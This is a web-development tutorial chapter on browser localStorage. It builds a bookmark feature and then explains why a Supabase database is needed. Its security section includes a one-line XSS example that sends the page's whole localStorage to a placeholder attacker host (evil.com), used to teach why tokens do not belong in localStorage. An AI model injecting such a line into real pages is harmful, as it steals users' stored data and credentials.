# Phase 6b — localStorage and Why You Need a Real Database
## Understanding Browser Storage Before You Build the Backend

> **Phase goal:** Understand what localStorage is, build a working feature with it, and then experience firsthand why it is not enough for a real multi-user application — so that the decision to use Supabase in the next phase makes complete sense.
>
> **Why this matters:** Every developer should learn localStorage before databases because it reveals *exactly* what a database solves. If you go straight to Supabase without this foundation, you risk treating it like magic. After this phase, you will understand the real constraints of browser storage and be able to explain to anyone why a backend database is non-negotiable.

---

## What Is localStorage?

localStorage is a key-value store built into every web browser. It lets your JavaScript save small amounts of data that persist across page reloads — the data stays even when the user closes and reopens the tab.

Think of it like a small sticky note attached to the user's browser.

```javascript
// Save data
localStorage.setItem('username', 'Alice');

// Read it back
const name = localStorage.getItem('username');  // "Alice"

// Delete it
localStorage.removeItem('username');

// Clear everything
localStorage.clear();
```

That's the entire API. Simple, synchronous, no setup required.

---

## What Can It Store?

localStorage stores **strings only**. To save objects or arrays, you convert them with `JSON.stringify` and parse them back with `JSON.parse`:

```javascript
// Save an array of bookmarks
const bookmarks = ['event-123', 'event-456', 'event-789'];
localStorage.setItem('bookmarks', JSON.stringify(bookmarks));

// Read it back as an array
const saved = JSON.parse(localStorage.getItem('bookmarks') || '[]');
```

---

## Hands-On: Build a Bookmark Feature with localStorage

Before you learn why localStorage falls short, build something with it so you can feel what it does well.

### The Feature

Add a bookmark button to your event cards. When a user clicks it, the event ID is saved to localStorage. On page load, any previously bookmarked events show a filled bookmark icon.

### Step 1 — The HTML Hook

Your event cards from Phase 6 should already have a `data-bookmark` attribute on the button and a `data-event-id` attribute on the card:

```html
<div class="event-card" data-event-id="event-123">
  <h3>AI Workshop at UR</h3>
  <button data-bookmark aria-label="Bookmark this event">
    <span class="material-symbols-outlined">bookmark</span>
  </button>
</div>
```

### Step 2 — The Bookmark Module

Create `assets/js/bookmarks-local.js`:

```javascript
const STORAGE_KEY = 'bookmarked_events';

function getBookmarks() {
  return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
}

function saveBookmarks(list) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
}

export function isBookmarked(eventId) {
  return getBookmarks().includes(eventId);
}

export function toggleBookmark(eventId) {
  const bookmarks = getBookmarks();
  const index = bookmarks.indexOf(eventId);
  if (index === -1) {
    bookmarks.push(eventId);
  } else {
    bookmarks.splice(index, 1);
  }
  saveBookmarks(bookmarks);
  return index === -1; // returns true if now bookmarked
}

export function initBookmarkButtons() {
  document.querySelectorAll('[data-bookmark]').forEach(button => {
    const card = button.closest('[data-event-id]');
    if (!card) return;
    const eventId = card.dataset.eventId;

    // Restore visual state on load
    if (isBookmarked(eventId)) {
      button.classList.add('bookmarked');
      button.querySelector('.material-symbols-outlined').textContent = 'bookmark';
    } else {
      button.querySelector('.material-symbols-outlined').textContent = 'bookmark_border';
    }

    // Toggle on click
    button.addEventListener('click', () => {
      const nowBookmarked = toggleBookmark(eventId);
      button.classList.toggle('bookmarked', nowBookmarked);
      button.querySelector('.material-symbols-outlined').textContent =
        nowBookmarked ? 'bookmark' : 'bookmark_border';
    });
  });
}
```

### Step 3 — Wire It Up

In your main JS file or `page-index.js`, import and call the initializer:

```javascript
import { initBookmarkButtons } from './bookmarks-local.js';

// After events are rendered:
initBookmarkButtons();
```

### What Works Well Here

This is genuinely useful. The bookmarks persist across page reloads. The code is simple. There's no server, no API, no network calls. For a quick demo or prototype, this is excellent.

Open the browser DevTools → Application → Local Storage to see your data stored there in real time.

---

## The Walls You Hit

Now test your localStorage bookmark feature with these scenarios and observe what happens:

### Test 1 — Different Device

Sign into your app on your phone (or a different computer). Your bookmarks are gone.

**Why:** localStorage lives in a single browser on a single device. It is not tied to a user account or synced anywhere. The moment someone switches devices, the data disappears.

### Test 2 — Incognito / Private Mode

Open your app in an incognito window. Your bookmarks are gone.

**Why:** Incognito mode uses a fresh, isolated localStorage that is wiped when the window closes. Your data did not persist.

### Test 3 — Clear Browser Data

In Chrome: Settings → Privacy → Clear browsing data → check "Cookies and site data" → Clear. Your bookmarks are gone.

**Why:** localStorage is stored as part of your browser's site data. Any user who clears their cache loses all their saved data. This is something users do regularly.

### Test 4 — Share with a Friend

Ask someone else to open your app. Can they see your bookmarks?

**Why:** localStorage is per-device, per-browser. It is physically impossible to share data stored in localStorage with another user. The data never leaves the browser.

### Test 5 — Check the Storage Limit

Try saving a large amount of data into localStorage and watch for this error:

```
DOMException: Failed to execute 'setItem' on 'Storage':
Setting the value of 'bookmarks' exceeded the quota.
```

**Why:** localStorage is limited to approximately **5 megabytes** per origin. This sounds like a lot until you try to store images, long text, or many records. For a real application with many users and many bookmarks, 5MB per user would be consumed quickly.

---

## The Deeper Problem: Security

The biggest limitation of localStorage is one that isn't immediately visible: **it is not secure**.

### Anyone Can Read It

localStorage data is readable by **any JavaScript running on the page** — including third-party scripts, analytics libraries, or ad networks you've loaded. If you accidentally store anything sensitive there, it's exposed.

```javascript
// Any script on your page can do this:
console.log(localStorage.getItem('user_token')); // dumps your token
```

### XSS (Cross-Site Scripting) Attacks

If your app ever has a Cross-Site Scripting vulnerability — where an attacker can inject JavaScript into your page — they can steal everything in localStorage immediately:

```javascript
// Attacker's injected code (just 1 line):
new Image().src = 'https://evil.com/steal?data=' + JSON.stringify(localStorage);
```

This is why **you should never store authentication tokens, session data, or any sensitive user information in localStorage**. A database with proper authentication and HTTPS communication is architecturally protected from this attack.

### No Access Control

localStorage has no concept of "this data belongs to user A." Any code can read and write any key. There is no way to enforce that user A can only see their own bookmarks and not user B's. This is a fundamental architectural limitation — not a bug you can fix.

---

## The Full Comparison

| Feature | localStorage | Supabase Database |
|---------|-------------|-------------------|
| Data persists after page reload | ✅ Yes | ✅ Yes |
| Data persists after clearing cache | ❌ No | ✅ Yes |
| Works across multiple devices | ❌ No | ✅ Yes |
| Works in incognito mode | ❌ No | ✅ Yes |
| Shareable between users | ❌ Never | ✅ Yes |
| Storage limit | ~5 MB | GB scale |
| Access control per user | ❌ None | ✅ Row Level Security |
| Protection from XSS token theft | ❌ Vulnerable | ✅ HttpOnly cookies |
| Server-side validation | ❌ None | ✅ Constraints + triggers |
| Backup and recovery | ❌ None | ✅ Point-in-time restore |
| Query and filter across all data | ❌ No | ✅ Full SQL |
| Works when JavaScript is disabled | ❌ No | ✅ Server returns data |

---

## When localStorage IS the Right Tool

Understanding the limits doesn't mean localStorage is useless. It's the right tool for specific use cases:

**Good uses for localStorage:**
- **UI preferences** — dark mode toggle, sidebar collapsed state, preferred language
- **Draft saving** — auto-save a partially filled form so users don't lose their work if they navigate away
- **Non-sensitive app state** — last-viewed category filter, column sort order
- **Offline-first experiments** — caching data locally so the app works without internet (paired with Service Workers)
- **Prototyping** — build the feature flow quickly before wiring to a real backend

**The mental model:** localStorage is a personal scratchpad for one browser. A database is a shared file cabinet for all users.

---

## The Upgrade Path

Now that you understand what localStorage can and cannot do, you are ready to see exactly why Supabase is introduced in the next phase. In Phase 7 and 8, you will:

1. Create a `saved_events` table in Supabase with a `user_id` foreign key
2. Replace `bookmarks-local.js` with `bookmarks-api.js` that reads/writes from the database
3. Any user, on any device, in any browser, will see their bookmarks — because the data lives on a server, not in a browser tab

The code change is small. The architectural difference is enormous.

```javascript
// Before (localStorage):
export function toggleBookmark(eventId) {
  const bookmarks = JSON.parse(localStorage.getItem('bookmarks') || '[]');
  // ... splice/push ...
  localStorage.setItem('bookmarks', JSON.stringify(bookmarks));
}

// After (Supabase):
export async function toggleBookmark(eventId) {
  const { data: existing } = await supabase
    .from('saved_events')
    .select('id')
    .eq('event_id', eventId)
    .single();

  if (existing) {
    await supabase.from('saved_events').delete().eq('event_id', eventId);
  } else {
    await supabase.from('saved_events').insert({ event_id: eventId });
  }
}
```

The Supabase version:
- Works on every device the user logs in from
- Is tied to a real user account (RLS ensures `user_id` is always set correctly)
- Cannot be accessed by other users' sessions
- Is protected against XSS token theft
- Survives browser cache clears, incognito mode, and new devices

---

## Checklist — You Are Ready to Move to Phase 7 When:

- [ ] You have built the localStorage bookmark feature and seen it work
- [ ] You have run all 5 test scenarios and observed the failures
- [ ] You can explain in your own words why localStorage is not suitable for user data
- [ ] You understand the XSS security risk of storing tokens in localStorage
- [ ] You understand the difference between per-device storage (localStorage) and per-user storage (a database)

---

*Next: [Phase 7 — Backend with Supabase MCP](07-SUPABASE-BACKEND-WITH-MCP.md)*
